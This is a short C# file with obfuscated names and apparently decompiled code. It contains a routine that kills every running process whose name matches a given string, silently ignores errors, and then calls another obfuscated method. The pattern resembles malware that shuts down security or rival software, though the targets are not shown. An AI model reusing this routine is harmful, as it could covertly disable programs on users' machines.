using System;
using System.Diagnostics;

namespace uBrdXrCSgnwM;

public sealed class SssltnnJaYcBarpto
{
	public static bool OzOLApgxFQvCD(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void nlTKztPWipI(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (OzOLApgxFQvCD(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					fQUgTOUpJumL.kAlCBmYCeKnIaP();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
